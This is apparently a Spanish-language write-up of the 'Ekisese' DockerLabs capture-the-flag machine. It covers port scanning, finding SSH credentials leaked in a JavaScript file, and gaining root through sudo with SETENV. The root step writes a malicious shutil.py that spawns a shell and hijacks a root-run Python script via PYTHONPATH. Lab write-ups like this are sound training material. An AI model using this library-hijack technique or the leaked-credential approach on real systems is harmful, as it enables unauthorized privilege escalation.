---
icon: flag
---

# Ekisese DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip ekisese.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh ekisese.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 21:02 CET
Nmap scan report for 172.17.0.2
Host is up (0.000056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.4 (Python 3.13.5)
|_http-server-header: Werkzeug/3.1.4 Python/3.13.5
|_http-title: DockerLabs
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
```

Veremos el puerto `5000` que aloja una pagina web en `python3` con la tecnologia de `Flask` ya que dicho puerto suele ser el tipico en estos casos, si entramos dentro veremos lo siguiente:

```
URL = http://<IP>:5000/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251203210345.png" alt=""><figcaption></figcaption></figure>

Veremos que es un reto de `XSS`, nos da la pista de que en el campo del `panel de dashboard` se puede injectar, pero despues de un rato buscando veremos el siguiente codigo de `JS`.

## Escalate user chocolate

```shell
view-source:http://<IP>:5000/static/js/ranking.js
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-17 210726.png" alt=""><figcaption></figcaption></figure>

Veremos que esta filtrado las credenciales de cuando lo consigues por `SSH`, por lo que vamos a conectarnos por el mismo.

### SSH

```shell
ssh chocolate@<IP>
```

Metemos como contraseña `chocolatito123`...

```
Linux 2b878741cd8c 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
chocolate@2b878741cd8c:~$ whoami
chocolate
```

Veremos que ha funcionado, por lo que seremos el usuario `chocolate`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for chocolate on 2b878741cd8c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User chocolate may run the following commands on 2b878741cd8c:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /usr/local/bin/cleanup.py
```

Vemos que podemos ejecutar `python3` junto con el `script` como `root`, por lo que vamos a explorar dicho `script`.

Pero vemos que la clave esta en `SETENV` por lo que nos permite modificar el `path` del entorno de `python3` pudiendo crear una libreria maliciosa en nuestra `home` por ejemplo y cargarla indicando nuestra `home` de esta forma:

```shell
echo 'import pty; pty.spawn("/bin/bash")' > /home/chocolate/shutil.py
sudo PYTHONPATH=/home/chocolate /usr/bin/python3 /usr/local/bin/cleanup.py
```

Info:

```
root@2b878741cd8c:/home/chocolate# whoami
root
```

Con esto ya seremos `root`, por lo que habremos terminado la maquina.
